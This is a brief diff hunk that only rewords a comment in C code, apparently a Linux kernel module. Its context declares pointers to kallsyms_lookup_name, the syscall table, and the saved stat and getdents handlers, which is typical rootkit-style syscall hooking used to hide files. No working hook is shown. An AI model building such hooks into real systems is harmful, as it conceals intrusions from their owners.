@@ -24,7 +24,7 @@ struct linux_dirent {
         char           d_name[];  /* Filename (null-terminated) */
 };
 
-// defining the pointers to kallsyms_lookup_name function, syscall table, and old stat and old getdents handler
+// defining the pointers to kallsyms_lookup_name function, syscall table, and old stat and old getdents handlers
 unsigned long (*kallsyms_lookup_name)(const char *name);
 unsigned long *sys_call_table;
 asmlinkage int (*old_stat)(const struct pt_regs *regs);
